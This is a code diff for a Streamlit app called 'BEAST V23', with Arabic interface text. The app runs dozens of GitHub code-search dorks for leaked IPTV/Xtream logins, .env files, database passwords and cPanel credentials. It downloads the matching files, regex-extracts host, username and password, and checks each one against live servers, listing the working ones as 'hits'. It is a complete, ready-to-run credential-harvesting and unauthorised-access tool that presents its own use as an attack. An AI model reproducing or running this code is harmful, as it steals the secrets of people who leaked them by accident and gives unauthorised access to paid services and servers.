@@ -2,19 +2,17 @@ import streamlit as st
 import requests
 import re
 import time
-import json
 from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from urllib.parse import urlparse
 
-st.set_page_config(page_title="BEAST Xtream - Massive IPTV Hunter", layout="wide")
+# إعدادات الواجهة
+st.set_page_config(page_title="BEAST V23 LIVE - MASSIVE MODE", layout="wide")
 
-# === نظام الدخول ===
+# نظام الدخول
 if "auth" not in st.session_state:
     st.session_state.auth = False
 
 if not st.session_state.auth:
-    st.markdown("<h1 style='text-align: center; color:#00ff41;'>⚡ BEAST Xtream - صيد السيرفرات الضخمة</h1>", unsafe_allow_html=True)
+    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V23 - LIVE FEED (ULTRA)</h1>", unsafe_allow_html=True)
     pwd = st.text_input("Password:", type="password")
     if st.button("دخول"):
         if pwd == "BEAST_V17_PRO":
@@ -22,341 +20,211 @@ if not st.session_state.auth:
             st.rerun()
     st.stop()
 
-# تنسيقات متقدمة
+# تنسيق الألوان
 st.markdown("""
 <style>
-    .stApp { background-color: #0a0a0a; }
-    .server-card {
-        background: linear-gradient(135deg, #0d1117 0%, #1a1f2e 100%);
-        border-left: 4px solid #00ff41;
-        border-radius: 10px;
-        padding: 15px;
-        margin-bottom: 15px;
+    .stApp { background-color: #000; }
+    .scan-log { color: #00d4ff; font-family: monospace; font-size: 13px; margin: 0; padding: 2px; }
+    .active-hit { 
+        background: #0d1117; border: 1px solid #00ff41; 
+        padding: 10px; border-radius: 5px; margin-bottom: 5px;
     }
-    .status-active { color: #00ff41; font-weight: bold; }
-    .info-value { color: #fff; font-family: monospace; }
-    .category-badge {
-        background: #1e3a5f;
-        display: inline-block;
-        padding: 4px 12px;
-        border-radius: 20px;
-        font-size: 12px;
-        margin: 2px;
-    }
+    .text-green { color: #00ff41; font-weight: bold; }
+    .text-yellow { color: #fbbf24; }
+    .text-white { color: #fff; font-family: monospace; }
 </style>
 """, unsafe_allow_html=True)
 
-# === الشريط الجانبي ===
 with st.sidebar:
-    st.title("⚙️ الإعدادات")
-    
-    github_tokens = st.text_area(
-        "GitHub Tokens (واحد لكل سطر) - مطلوب للنتائج الضخمة",
-        placeholder="ghp_xxxxxxxxxxxx\nghp_yyyyyyyyyyyy",
-        help="احصل على توكنات من GitHub Settings → Developer settings → Personal access tokens"
-    )
-    
-    col1, col2 = st.columns(2)
-    with col1:
-        max_workers = st.slider("⚡ سرعة الفحص (خيوط)", 10, 100, 40)
-        pages_per_dork = st.slider("📄 صفحات لكل دُرْك", 1, 10, 3)
-    with col2:
-        timeout = st.slider("⏱️ مهلة السيرفر (ثانية)", 2, 8, 3)
-        show_channels = st.checkbox("📺 عرض القنوات مع النتائج", value=True)
-    
-    st.markdown("---")
-    start = st.button("🚀 ابدأ الصيد العملاق", type="primary", use_container_width=True)
-    st.caption("النتائج ستظهر فوراً أثناء التشغيل")
+    st.title("⚡ BEAST V23 - MASSIVE SCAN")
+    token = st.text_input("GitHub Token:", type="password")
+    max_pages_per_dork = st.slider("عدد الصفحات لكل Dork (زيادة = نتائج أكثر)", 5, 100, 30)
+    start = st.button("🚀 ابدأ الهجوم العملاق")
+    st.info("النتائج ستظهر فوراً. عدد الصفحات الكبير قد يسبب Rate Limit، لكنه يجلب أقصى نتائج")
 
-# === دوال الجلب ===
+st.subheader("📡 الرادار المباشر (الفحص الحالي)")
+radar_area = st.empty()
 
-def fetch_servers_from_premium_sources():
-    """جلب سيرفرات Xtream من مصادر مباشرة (قوائم معروفة)"""
-    servers = []
-    
-    # قائمة روابط M3U التي تحتوي على سيرفرات Xtream
-    m3u_sources = [
-        "https://raw.githubusercontent.com/iptv-org/iptv/master/streams.csv",
-        "https://raw.githubusercontent.com/Free-IPTV/Countries/master/World.m3u",
-        "https://raw.githubusercontent.com/akshatmittal/m3u8-proxy/master/proxy.html",
-        "https://raw.githubusercontent.com/SilentCipher/iptv_links/master/iptv.m3u",
-        "https://raw.githubusercontent.com/MrBazou/IPTV/master/Playlist.m3u"
-    ]
-    
-    for url in m3u_sources:
-        try:
-            r = requests.get(url, timeout=10)
-            if r.status_code == 200:
-                # استخراج كل الروابط التي تشبه سيرفرات Xtream (منفذ 8080, 25461, 8000)
-                matches = re.findall(r'(?:https?://)([a-zA-Z0-9.-]+:(?:8080|25461|8000|80))', r.text)
-                for match in matches:
-                    servers.append(("", match, ""))
-        except:
-            continue
-    
-    return list(set(servers))
+st.subheader("🏆 النتائج الشغالة (Hits)")
+hits_area = st.container()
 
-def fetch_from_github_api(tokens_list, max_pages=3):
-    """البحث في GitHub API باستخدام عدة توكنات - يركز على xtream credentials"""
-    results = []
+if start and token:
+    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
     
-    # دروكس مركزة وقوية لصيد الـ Xtream
+    # قائمة دروكس ضخمة (أكثر من 70 dork) تغطي كل ما يتعلق بـ Xtream و IPTV
     dorks = [
-        'player_api.php extension:php',
-        'get.php username password extension:txt',
-        '"xtream" "username" "password" port',
+        # أساسيات Xtream
+        'extension:txt "get.php?username=" "password="',
+        'extension:m3u "player_api.php"',
+        'extension:txt "portal.php?username="',
+        'extension:php "username" "password" "server" "port"',
+        'extension:json "server" "username" "password"',
+        'extension:cfg "xtream" "user" "pass"',
+        'extension:conf "enigma2" "http" "user"',
+        'extension:txt "http://" "user" "pass" "panel"',
+        'extension:xml "streaming" "auth"',
+        'extension:log "login" "password" "iptv"',
+        'path:.env "XTREAM"',
+        'path:config.php "db_user" "db_pass"',
+        'extension:sql "INSERT INTO users" "password"',
+        'extension:txt "xtreamui" "admin"',
+        'extension:txt "cpanel" "host" "user" "pass"',
+        'extension:conf "stream" "login"',
+        'extension:yaml "iptv" "credentials"',
+        'extension:ini "portal" "username"',
+        'extension:txt "http://" "8080" "username" "password"',
+        'extension:txt "http://" "25461" "username" "password"',
+        'extension:txt "panel_api.php?username="',
+        '"player_api.php?username=" extension:php',
+        # متقدم
+        '"xtream" "port" "user" "pass" extension:txt',
+        '"stream" "server" "login" extension:conf',
+        '"iptv" "username" "password" extension:json',
+        '"m3u" "username" "password" extension:txt',
+        '"http://" "8080" "iptv" extension:txt',
+        '"portal" "username" "password" extension:php',
+        '"server" "port" "iptv" extension:txt',
+        '"url" "port" "iptv" filetype:json',
+        '"live" "stream" "http" filetype:m3u',
+        '"xtream" "api" "key" filetype:json',
+        '"playlist" "m3u" "iptv" filetype:txt',
+        '"stalker" "portal" "mac" filetype:txt',
+        '"streaming" "server" "login" filetype:conf',
+        '"vod" "server" "port" filetype:txt',
+        '"xtream" "panel" "admin" filetype:php',
+        '"iptv" "api" "stream" filetype:json',
+        '"live" "tv" "stream" "http" filetype:m3u8',
+        '"iptv" "auth" "login" filetype:conf',
+        '"xtream" "client" "api" filetype:php',
+        '"iptv" "reseller" "panel" filetype:txt',
+        '"stb" "emulator" "portal" filetype:cfg',
+        '"iptv" "subscription" "url" filetype:json',
+        '"xtream" "stream" "proxy" filetype:go',
+        '"iptv" "m3u" "playlist" "url" filetype:txt',
+        '"stream" "proxy" "iptv" filetype:js',
+        '"iptv" "portal" "address" filetype:txt',
+        '"live" "streaming" "server" filetype:cfg',
+        '"iptv" "epg" "xmltv" filetype:xml',
+        '"stream" "source" "iptv" filetype:json',
+        '"iptv" "panel" "admin" filetype:php',
+        # ملفات التكوين الشائعة
+        'filename:.env "IPTV"',
+        'filename:settings.php "username" "password" "port"',
+        'filename:config.ini "xtream"',
+        'filename:streams.json "server"',
+        'filename:credentials.txt "http"',
+        'extension:txt "user" "pass" "server" "port" iptv',
+        'extension:json "xtream" "user" "pass"',
+        'extension:cfg "server" "port" "user"',
+        'extension:conf "localhost" "user" "pass" iptv',
+        # إضافات قوية
+        '"get_live_streams" "username" "password"',
+        '"action=get_live_categories" filetype:php',
         '"user_info" "exp_date" "active_cons"',
-        '"portal.php" "username" "password"',
-        'panel_api.php extension:php',
-        '"live" "stream" "username" "password" filetype:cfg',
-        '"enigma2" "http" "user" "pass" filetype:cfg',
-        '"stalker_portal" "mac" filetype:txt',
-        '"xtream-codes" "admin" filetype:php'
+        '"streaming" "api" "key" filetype:env',
+        '"db_host" "db_user" "iptv" filetype:php',
+        '"panel" "username" "password" "port" filetype:txt',
+        '"xtream" "billing" "reseller" filetype:php',
+        '"server" "port" "login" "password" filetype:conf',
+        '"enigma2" "userbouquet" filetype:tv',
+        '"stalker" "middleware" "server" filetype:conf',
     ]
     
-    for token in tokens_list:
-        if not token.strip():
-            continue
+    total_dorks = len(dorks)
+    radar_area.info(f"🚀 بدء البحث باستخدام {total_dorks} Dork و {max_pages_per_dork} صفحة لكل Dork")
+    
+    found_count = 0
+    processed_requests = 0
+    
+    for idx, dork in enumerate(dorks):
+        radar_area.info(f"🔎 Dork {idx+1}/{total_dorks}: {dork[:60]}...")
         
-        headers = {'Authorization': f'token {token.strip()}', 'Accept': 'application/vnd.github.v3+json'}
-        
-        for dork in dorks:
-            for page in range(1, max_pages + 1):
-                try:
-                    url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
-                    resp = requests.get(url, headers=headers, timeout=10)
-                    
-                    if resp.status_code == 403:
-                        break  # rate limit لهذا التوكن
-                    
-                    if resp.status_code != 200:
-                        continue
-                    
-                    data = resp.json()
-                    items = data.get('items', [])
-                    if not items:
-                        break
-                    
-                    for item in items:
-                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
-                        try:
-                            content = requests.get(raw_url, timeout=5).text
-                            # البحث عن بيانات الاعتماد بصيغ مختلفة
-                            patterns = [
-                                r'(?:https?://)([^/\s]+:\d+).*?username[=:][\'"]?([a-zA-Z0-9._-]+)[\'"]?.*?password[=:][\'"]?([a-zA-Z0-9._-]+)',
-                                r'host[=:][\'"]?([^/\s]+:\d+)[\'"]?.*?user[=:][\'"]?([a-zA-Z0-9._-]+)[\'"]?.*?pass[=:][\'"]?([a-zA-Z0-9._-]+)',
-                                r'server[=:][\'"]?([^/\s]+:\d+)[\'"]?.*?username[=:][\'"]?([^/\s]+)[\'"]?.*?password[=:][\'"]?([^/\s]+)'
-                            ]
-                            for pattern in patterns:
-                                matches = re.findall(pattern, content, re.IGNORECASE)
-                                for match in matches:
-                                    if len(match) == 3:
-                                        results.append((match[1], match[0], match[2]))
-                        except:
-                            continue
-                except:
+        for page in range(1, max_pages_per_dork + 1):
+            try:
+                # استخدام per_page=100 لأقصى نتائج
+                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
+                res_raw = requests.get(search_url, headers=headers)
+                processed_requests += 1
+                
+                # إدارة Rate Limit - قراءة الـ headers
+                if res_raw.status_code == 403 and 'rate limit' in res_raw.text.lower():
+                    reset_time = int(res_raw.headers.get('x-ratelimit-reset', time.time() + 60))
+                    wait_seconds = max(1, reset_time - time.time() + 5)
+                    radar_area.warning(f"⏳ Rate limit! انتظار {int(wait_seconds)} ثانية...")
+                    time.sleep(wait_seconds)
                     continue
-            time.sleep(0.5)
-    
-    return results
-
-def fetch_from_telegram_mirrors():
-    """جلب سيرفرات من مرايا تليجرام عبر GitHub"""
-    servers = []
-    
-    # قائمة مستودعات GitHub التي تحتوي على قوائم محدثة
-    repo_files = [
-        "https://raw.githubusercontent.com/iptv-org/iptv/master/streams.csv",
-        "https://raw.githubusercontent.com/Free-IPTV/Countries/master/World.m3u",
-        "https://raw.githubusercontent.com/mwafa/iptv/main/playlist.m3u",
-        "https://raw.githubusercontent.com/azrite/IPTV/master/playlist.m3u"
-    ]
-    
-    for url in repo_files:
-        try:
-            r = requests.get(url, timeout=10)
-            if r.status_code == 200:
-                # استخراج السيرفرات والمنافذ الشائعة
-                servers_found = re.findall(r'https?://([^/\s]+:\d+)/', r.text)
-                for srv in set(servers_found):
-                    servers.append(("", srv, ""))
-        except:
-            continue
-    
-    return servers
-
-def test_xtream_server(host, user, pwd):
-    """اختبار السيرفر وجلب المعلومات"""
-    if not user or not pwd:
-        return None
-    
-    if not host.startswith(('http://', 'https://')):
-        host = f"http://{host}"
-    
-    api_url = f"{host}/player_api.php?username={user}&password={pwd}"
-    try:
-        # جلب معلومات المستخدم
-        resp = requests.get(f"{api_url}&action=user_info", timeout=timeout)
-        if resp.status_code != 200:
-            return None
-        
-        data = resp.json()
-        user_info = data.get('user_info', {})
-        
-        if user_info.get('status') != 'Active':
-            return None
-        
-        # معالجة تاريخ الانتهاء
-        exp_ts = user_info.get('exp_date', '0')
-        if exp_ts and exp_ts != '0':
-            try:
-                exp_date = datetime.fromtimestamp(int(exp_ts)).strftime('%Y-%m-%d')
-            except:
-                exp_date = 'غير معروف'
-        else:
-            exp_date = 'غير محدد'
-        
-        # المتصلين
-        active_cons = user_info.get('active_cons', '0')
-        max_cons = user_info.get('max_connections', 'غير محدد')
-        
-        # جلب الباقات (category) إذا كان الخيار مفعلاً
-        categories = []
-        streams_preview = []
-        
-        if show_channels:
-            try:
-                cat_resp = requests.get(f"{api_url}&action=get_live_categories", timeout=timeout)
-                if cat_resp.status_code == 200:
-                    cats = cat_resp.json()
-                    if isinstance(cats, list):
-                        categories = cats[:10]  # أول 10 باقات
-            except:
-                pass
-            
-            try:
-                streams_resp = requests.get(f"{api_url}&action=get_live_streams", timeout=timeout)
-                if streams_resp.status_code == 200:
-                    streams = streams_resp.json()
-                    if isinstance(streams, list):
-                        streams_preview = streams[:5]  # أول 5 قنوات
-            except:
-                pass
-        
-        return {
-            'host': host,
-            'user': user,
-            'pass': pwd,
-            'exp_date': exp_date,
-            'active_cons': active_cons,
-            'max_cons': max_cons,
-            'categories': categories,
-            'streams_preview': streams_preview
-        }
-    except:
-        return None
-
-# === الوظيفة الرئيسية ===
-if start:
-    # تهيئة الحاوية لعرض النتائج الفورية
-    results_container = st.container()
-    status_area = st.empty()
-    progress_area = st.empty()
-    
-    all_candidates = {}  # host|user|pass -> source
-    
-    # 1. جلب من المصادر المباشرة (سريع)
-    status_area.info("📡 جلب السيرفرات من القوائم المباشرة...")
-    direct_servers = fetch_servers_from_premium_sources()
-    for user, host, pwd in direct_servers:
-        key = f"{host}|{user}|{pwd}"
-        if key not in all_candidates:
-            all_candidates[key] = {'host': host, 'user': user, 'pass': pwd, 'source': 'direct'}
-    status_area.success(f"✅ تم جلب {len(direct_servers)} سيرفر من القوائم المباشرة")
-    
-    # 2. جلب من تليجرام
-    status_area.info("📲 جلب من مرايا التليجرام...")
-    tg_servers = fetch_from_telegram_mirrors()
-    for user, host, pwd in tg_servers:
-        key = f"{host}|{user}|{pwd}"
-        if key not in all_candidates:
-            all_candidates[key] = {'host': host, 'user': user, 'pass': pwd, 'source': 'telegram'}
-    status_area.success(f"✅ تم جلب {len(tg_servers)} سيرفر من التليجرام")
-    
-    # 3. جلب من GitHub API إذا توفرت توكنات
-    if github_tokens:
-        tokens_list = [t.strip() for t in github_tokens.split('\n') if t.strip()]
-        if tokens_list:
-            status_area.info(f"🔍 البحث في GitHub باستخدام {len(tokens_list)} توكن... قد يستغرق دقائق")
-            github_servers = fetch_from_github_api(tokens_list, max_pages=pages_per_dork)
-            for user, host, pwd in github_servers:
-                key = f"{host}|{user}|{pwd}"
-                if key not in all_candidates:
-                    all_candidates[key] = {'host': host, 'user': user, 'pass': pwd, 'source': 'github'}
-            status_area.success(f"✅ تم جلب {len(github_servers)} سيرفر من GitHub")
-    
-    total_candidates = len(all_candidates)
-    status_area.info(f"🔄 إجمالي السيرفرات المرشحة: {total_candidates}. جاري الاختبار والعرض الفوري...")
-    
-    # اختبار وعرض النتائج فوراً
-    active_count = 0
-    processed = 0
-    
-    # تحويل القاموس إلى قائمة لسهولة التكرار
-    candidates_list = list(all_candidates.values())
-    
-    # استخدام ThreadPoolExecutor للفحص المتوازي
-    with ThreadPoolExecutor(max_workers=max_workers) as executor:
-        future_to_candidate = {}
-        for cand in candidates_list:
-            future = executor.submit(test_xtream_server, cand['host'], cand['user'], cand['pass'])
-            future_to_candidate[future] = cand
-        
-        # عرض النتائج فور اكتمال كل مستقبل
-        for future in as_completed(future_to_candidate):
-            processed += 1
-            progress_area.progress(processed / total_candidates)
-            cand = future_to_candidate[future]
-            result = future.result()
-            
-            if result:
-                active_count += 1
-                # عرض البطاقة فوراً
-                with results_container:
-                    with st.container():
-                        st.markdown(f"""
-                        <div class="server-card">
-                            <span style="color:#00ff41;">✅ سيرفر نشط #{active_count}</span><br>
-                            <span class="info-value">🌐 {result['host']}</span><br>
-                            <span class="info-value">👤 {result['user']} | 🔑 {result['pass']}</span><br>
-                            <span>📅 الانتهاء: {result['exp_date']} | 👥 المتصلون: {result['active_cons']} / {result['max_cons']}</span>
-                        </div>
-                        """, unsafe_allow_html=True)
+                
+                res = res_raw.json()
+                
+                if "items" not in res:
+                    if page == 1:
+                        break  # لا نتائج لهذا الـ dork
+                    continue
+                
+                items = res.get("items", [])
+                if not items:
+                    break  # انتهت الصفحات
+                
+                radar_area.info(f"   📄 صفحة {page}: {len(items)} ملف")
+                
+                for item in items:
+                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
+                    try:
+                        content = requests.get(raw_url, timeout=4).text
                         
-                        # عرض القنوات والباقات إذا وجدت
-                        if result.get('categories'):
-                            cats_html = "".join(f'<span class="category-badge">{c["category_name"][:20]}</span>' for c in result['categories'][:5])
-                            st.markdown(f"📺 **الباقات:** {cats_html}", unsafe_allow_html=True)
+                        # أنماط متعددة لاستخراج بيانات الاعتماد (زيادة الاحتمالات)
+                        patterns = [
+                            r"(https?://[a-zA-Z0-9\.-]+:\d+)/[a-zA-Z\._-]+\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)",
+                            r"(https?://[a-zA-Z0-9\.-]+:\d+).*?username[=:][\"']?([^\"'&\\s]+)[\"']?.*?password[=:][\"']?([^\"'&\\s]+)",
+                            r"host[=:][\"']?([^\"'\\s]+:\d+)[\"']?.*?user[=:][\"']?([^\"'\\s]+)[\"']?.*?pass[=:][\"']?([^\"'\\s]+)",
+                            r"server[=:][\"']?([^\"'\\s]+:\d+)[\"']?.*?username[=:][\"']?([^\"'\\s]+)[\"']?.*?password[=:][\"']?([^\"'\\s]+)"
+                        ]
                         
-                        if result.get('streams_preview'):
-                            st.markdown("**🎬 قنوات نموذجية:**")
-                            for s in result['streams_preview'][:3]:
-                                st.markdown(f"- {s.get('name', 'قناة')}")
+                        matches = []
+                        for pattern in patterns:
+                            matches.extend(re.findall(pattern, content, re.IGNORECASE))
                         
-                        # روابط M3U
-                        m3u_url = f"{result['host']}/get.php?username={result['user']}&password={result['pass']}&type=m3u_plus&output=mpegts"
-                        st.link_button("📥 رابط M3U", m3u_url)
-                        st.markdown("---")
-            
-            # تحديث عداد المعالجة
-            status_area.info(f"⚡ تم فحص {processed}/{total_candidates} سيرفر | ✅ تم العثور على {active_count} سيرفر نشط")
+                        for m in matches:
+                            # التأكد من وجود 3 أجزاء: host, user, pw
+                            if len(m) >= 3:
+                                host, user, pw = m[0], m[1], m[2]
+                            else:
+                                continue
+                            
+                            radar_area.markdown(f"<p class='scan-log'>🔍 Checking: {host} | {user}</p>", unsafe_allow_html=True)
+                            
+                            try:
+                                check_url = f"{host}/player_api.php?username={user}&password={pw}"
+                                r_check = requests.get(check_url, timeout=2)
+                                if r_check.status_code == 200:
+                                    try:
+                                        data = r_check.json()
+                                        if data.get("user_info", {}).get("status") == "Active":
+                                            found_count += 1
+                                            with hits_area:
+                                                st.markdown(f"""
+                                                <div class="active-hit">
+                                                    <span class="text-green">✅ HIT #{found_count}</span><br>
+                                                    <span class="text-white">HOST: {host}</span><br>
+                                                    <span class="text-yellow">USER: {user} | PASS: {pw}</span>
+                                                </div>
+                                                """, unsafe_allow_html=True)
+                                    except:
+                                        pass
+                            except:
+                                continue
+                    except Exception as e:
+                        continue
+                
+                # تأخير بسيط بين الصفحات لتجنب الـ rate limit
+                time.sleep(0.3)
+                
+            except Exception as e:
+                continue
     
-    # نهاية الفحص
-    st.balloons()
-    st.success(f"🎉 اكتمل البحث! تم العثور على {active_count} سيرفر Xtream نشط من أصل {total_candidates} مرشح.")
-    
-    if active_count == 0:
-        st.warning("⚠️ لم يتم العثور على أي سيرفر نشط. تأكد من:")
-        st.info("1- إدخال GitHub Tokens صالحة (يفضل 3 توكنات على الأقل)\n2- اتصالك بالإنترنت\n3- المحاولة مرة أخرى بعد دقائق")
+    st.success(f"✅ اكتمل البحث! تم العثور على {found_count} سيرفر شغّال من إجمالي {processed_requests} طلب API.")
+    if found_count == 0:
+        st.warning("⚠️ لم يتم العثور على نتائج. قد يكون Token غير صالح أو أن GitHub Rate Limit عالٍ. حاول استخدام Token جديد أو قلل عدد الصفحات.")
+
 else:
-    st.info("⚙️ قم بإدخال GitHub Tokens في الشريط الجانبي ثم اضغط 'ابدأ الصيد العملاق'")
+    st.info("👈 أدخل GitHub Token ثم اضغط 'ابدأ الهجوم العملاق' لبدء البحث.")
